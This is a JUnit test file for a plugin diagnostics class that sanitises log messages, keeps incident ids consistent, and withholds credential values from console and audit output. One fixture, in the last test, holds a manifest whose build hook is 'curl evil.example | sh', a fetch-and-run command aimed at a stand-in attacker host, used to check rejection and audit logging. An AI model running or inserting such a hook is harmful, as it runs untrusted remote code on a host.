package ai.ravenroot.server.plugin;

import ai.ravenroot.api.node.NodeBehavior;
import ai.ravenroot.api.node.NodePackage;
import ai.ravenroot.api.node.NodeSdk;
import ai.ravenroot.core.ai.AgentRuntimeRegistry;
import ai.ravenroot.core.ai.ModelProviderRegistry;
import ai.ravenroot.core.programming.DisabledProgramRuntime;
import ai.ravenroot.core.programming.InMemoryArtifactRegistry;
import ai.ravenroot.core.runtime.BehaviorEnvironment;
import ai.ravenroot.core.runtime.BehaviorRegistry;
import ai.ravenroot.core.runtime.NodePackages;
import ai.ravenroot.core.security.AllowlistToolPolicy;
import ai.ravenroot.core.security.EnvironmentCredentialResolver;
import ai.ravenroot.core.security.OutboundHttpPolicy;
import ai.ravenroot.core.security.ProviderCredentialResolver;
import ai.ravenroot.plugin.bundle.PluginBundleException;
import ai.ravenroot.plugin.bundle.PluginManifest;
import com.example.orchestratorfixture.ServiceAwareOrchestratorFixtureNodePackage;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * {@link PluginActivationDiagnostics} is pure, so the sanitization rule can be verified directly:
 * what {@link PluginActivationDiagnostics#neutralize} strips, and that {@link
 * PluginActivationDiagnostics#diagnose} produces exactly one incident id shared by the console
 * message and the audit record, for every failure shape the loader or {@code NodePackages.register}
 * can throw -- not just {@link PluginBundleException}, which carries its own.
 */
class PluginActivationDiagnosticsTest {

    @Test
    void neutralizeStripsNewlinesThatWouldForgeAdditionalLogLines() {
        String result = PluginActivationDiagnostics.neutralize("first line\nfake second line\rfake third");
        assertFalse(result.contains("\n"));
        assertFalse(result.contains("\r"));
        assertEquals("'first linefake second linefake third'", result);
    }

    @Test
    void neutralizeStripsBidiOverrideAndZeroWidthCharactersEvenThoughTheyAreLegalInAJavaIdentifier() {
        // U+202E RIGHT-TO-LEFT OVERRIDE and U+200B ZERO WIDTH SPACE: both Character.getType() == FORMAT,
        // both legal in a Java identifier per Character.isJavaIdentifierPart, and both capable of making
        // displayed text visually different from what it is -- the gap DESIGN.md names explicitly for
        // why neutralization applies even to the "already bounded, structurally constrained" category.
        String withBidiOverride = "safe‮looking​class.Name";

        String result = PluginActivationDiagnostics.neutralize(withBidiOverride);

        assertFalse(result.contains("‮"));
        assertFalse(result.contains("​"));
        assertEquals("'safelookingclass.Name'", result);
    }

    @Test
    void neutralizeCapsLengthRatherThanEmittingAnUnboundedString() {
        String huge = "x".repeat(10_000);

        String result = PluginActivationDiagnostics.neutralize(huge);

        assertTrue(result.length() < 300, () -> "expected a capped result, got " + result.length() + " chars");
        assertTrue(result.endsWith("...<truncated>'"));
    }

    @Test
    void neutralizeQuotesTheResultUnambiguously() {
        assertEquals("'plain text'", PluginActivationDiagnostics.neutralize("plain text"));
        assertEquals("''", PluginActivationDiagnostics.neutralize(null));
    }

    @Test
    void diagnosingAPluginBundleExceptionReusesItsOwnIncidentIdInBothPlaces() {
        PluginBundleException rejection = assertThrows(PluginBundleException.class,
                () -> PluginManifest.read("not json"));

        var diagnosis = PluginActivationDiagnostics.diagnose(rejection);

        assertEquals(rejection.incidentId(), diagnosis.incidentId());
        assertTrue(diagnosis.consoleMessage().contains(diagnosis.incidentId()));
        assertEquals(rejection.reason().name(), diagnosis.reasonToken());
    }

    /**
     * Exposing {@code consoleMessage()}, {@code incidentIdOf()} and {@code reasonTokenOf()} as three
     * independently callable functions would make each call mint a fresh random id for a failure
     * type without its own incident id (this one), so calling
     * two of those functions for the SAME failure produced two DIFFERENT incident ids, breaking the
     * exact correlation the mechanism exists to provide. diagnose() computes it once and returns all
     * of it together specifically so that mistake cannot be reintroduced.
     */
    @Test
    void diagnosingAGenericFailureProducesExactlyOneIncidentIdSharedByConsoleAndAudit() {
        RuntimeException registrationFailure = new IllegalArgumentException(
                "Behavior 'mail.send' is already registered");

        var diagnosis = PluginActivationDiagnostics.diagnose(registrationFailure);

        assertTrue(diagnosis.consoleMessage().contains(diagnosis.incidentId()),
                "the console message must show the same incident id diagnose() returned");
        assertEquals("PACKAGE_REGISTRATION_FAILED", diagnosis.reasonToken());
        assertTrue(diagnosis.consoleMessage().contains("mail.send"),
                () -> "NodePackages.register's own message is already bounded/actionable and belongs "
                        + "in the console message: " + diagnosis.consoleMessage());
    }

    @Test
    void diagnosingAnIncompatibleSdkContractUsesItsOwnDedicatedReasonToken() {
        NodePackage incompatiblePackage = new NodePackage() {
            @Override
            public String id() {
                return "test.incompatible";
            }

            @Override
            public String version() {
                return "1.0.0";
            }

            @Override
            public String sdkContract() {
                return "ravenroot.node-sdk/999";
            }

            @Override
            public List<NodeBehavior> behaviors() {
                return List.of();
            }
        };
        NodeSdk.IncompatibleNodePackageException incompatible = assertThrows(
                NodeSdk.IncompatibleNodePackageException.class, () -> NodeSdk.requireSupported(incompatiblePackage));

        var diagnosis = PluginActivationDiagnostics.diagnose(incompatible);

        assertEquals("INCOMPATIBLE_NODE_SDK", diagnosis.reasonToken());
        assertTrue(diagnosis.consoleMessage().contains("test.incompatible"));
    }

    /**
     * Verifies the missing-grant diagnostic at the level where the message is built. The refusal is provoked
     * through the real {@code NodePackages.registerAll} rather than by handing this class a
     * handwritten string: {@link PluginActivationDiagnostics#missingGrantVariable} recognises that
     * refusal by its message, and a coupling to a message is only safe if something breaks when the
     * message changes. This is that something.
     */
    @Test
    void aMissingGrantNamesThePackageTheCapabilityAndTheVariableThatWouldGrantIt() {
        IllegalArgumentException refused = assertThrows(IllegalArgumentException.class,
                () -> NodePackages.registerAll(
                        BehaviorRegistry.standard(behaviorEnvironment()),
                        List.of(new ServiceAwareOrchestratorFixtureNodePackage())));

        var diagnosis = PluginActivationDiagnostics.diagnose(refused);

        assertEquals("NODE_PACKAGE_SERVICES_NOT_GRANTED", diagnosis.reasonToken());
        assertTrue(diagnosis.consoleMessage().contains("test.orchestrator.services"),
                diagnosis::consoleMessage);
        assertTrue(diagnosis.consoleMessage().contains("outbound-http"), diagnosis::consoleMessage);
        assertTrue(diagnosis.consoleMessage().contains(EnvironmentNodePackageServiceGrants
                        .environmentVariableName("test.orchestrator.services")),
                () -> "an operator must be able to copy the variable out of the message: "
                        + diagnosis.consoleMessage());
        assertTrue(diagnosis.consoleMessage().contains(diagnosis.incidentId()));
    }

    @Test
    void aRefusalThatIsNotAMissingGrantKeepsTheGenericRegistrationReason() {
        // The recogniser is anchored, so a message that merely mentions a package is not this refusal
        // and gets no invented variable name.
        var diagnosis = PluginActivationDiagnostics.diagnose(new IllegalArgumentException(
                "Node package 'test.orchestrator.services' is declared more than once"));

        assertEquals("PACKAGE_REGISTRATION_FAILED", diagnosis.reasonToken());
        assertFalse(diagnosis.consoleMessage().contains("RAVENROOT_NODE_PACKAGE_SERVICES_"),
                diagnosis::consoleMessage);
    }

    @Test
    void anUnreadableGrantIsItsOwnReasonAndNamesTheVariableWithoutItsValue() {
        String variable = EnvironmentNodePackageServiceGrants
                .environmentVariableName("ai.ravenroot.extensions.storage");
        NodePackageServiceGrantException malformed = assertThrows(NodePackageServiceGrantException.class,
                () -> EnvironmentNodePackageServiceGrants.fromEnvironment(
                        java.util.Map.of(variable, "not-base64-at-all!"),
                        (packageId, tenantId, reference) -> java.util.Optional.empty()));

        var diagnosis = PluginActivationDiagnostics.diagnose(malformed);

        assertEquals("NODE_PACKAGE_SERVICE_GRANT_INVALID", diagnosis.reasonToken());
        assertTrue(diagnosis.consoleMessage().contains(variable), diagnosis::consoleMessage);
        assertFalse(diagnosis.consoleMessage().contains("not-base64-at-all!"),
                () -> "the grant's value never reaches the console: " + diagnosis.consoleMessage());
        assertFalse(diagnosis.auditDetail().contains("not-base64-at-all!"),
                () -> "nor the audit record: " + diagnosis.auditDetail());
    }

    @Test
    void theSigningReferenceRefusalKeepsItsOwnRemedyInsideTheConsoleCap() {
        // neutralize() caps the console message at 200 characters. A refusal whose remedy falls off
        // that cliff leaves the operator with a diagnosis and no instruction -- the same "named but
        // not actionable" failure the whole class exists to close. Pinned against the real cap
        // rather than against a length constant, so shortening the cap fails here too.
        String variable = EnvironmentNodePackageServiceGrants
                .environmentVariableName("ai.ravenroot.extensions.storage");
        NodePackageServiceGrantException refused = assertThrows(NodePackageServiceGrantException.class,
                () -> EnvironmentNodePackageServiceGrants.fromEnvironment(
                        java.util.Map.of(variable, java.util.Base64.getEncoder().encodeToString("""
                                {"capabilities":["outbound-http","credential-resolution"],
                                 "credentialReferences":["api-key"],
                                 "awsSigV4Bindings":[{"bindingId":"storage",
                                   "origin":{"scheme":"https","host":"s3.example.com","port":443},
                                   "credentialReference":"storage-key","region":"eu-west-1",
                                   "service":"s3"}]}"""
                                .getBytes(java.nio.charset.StandardCharsets.UTF_8))),
                        (packageId, tenantId, reference) -> java.util.Optional.empty()));

        var diagnosis = PluginActivationDiagnostics.diagnose(refused);

        assertFalse(diagnosis.consoleMessage().contains("<truncated>"), diagnosis::consoleMessage);
        assertTrue(diagnosis.consoleMessage().contains("'storage'"), diagnosis::consoleMessage);
        assertTrue(diagnosis.consoleMessage().contains("Add it to the list"), diagnosis::consoleMessage);
        assertTrue(diagnosis.consoleMessage().contains(variable), diagnosis::consoleMessage);
        assertFalse(diagnosis.consoleMessage().contains("storage-key"),
                () -> "the credential reference itself never reaches the console: "
                        + diagnosis.consoleMessage());
        assertFalse(diagnosis.auditDetail().contains("storage-key"),
                () -> "nor the audit record: " + diagnosis.auditDetail());
    }

    private static BehaviorEnvironment behaviorEnvironment() {
        return new BehaviorEnvironment(new ModelProviderRegistry(), new AgentRuntimeRegistry(),
                new InMemoryArtifactRegistry(), new DisabledProgramRuntime(),
                new ProviderCredentialResolver(new EnvironmentCredentialResolver()),
                AllowlistToolPolicy.fromCommaSeparated(null),
                OutboundHttpPolicy.fromCommaSeparatedHosts(null));
    }

    @Test
    void auditDetailCarriesTheFullDiagnosticDetailUnredactedAndUncapped() {
        PluginBundleException rejection = assertThrows(PluginBundleException.class,
                () -> PluginManifest.read("{\"schemaVersion\":\"1\",\"buildHook\":\"curl evil.example | sh\"}"));

        var diagnosis = PluginActivationDiagnostics.diagnose(rejection);

        assertTrue(diagnosis.auditDetail().contains("buildHook"),
                () -> "the audit record is the complete one, never capped the way the console message is: "
                        + diagnosis.auditDetail());
    }
}
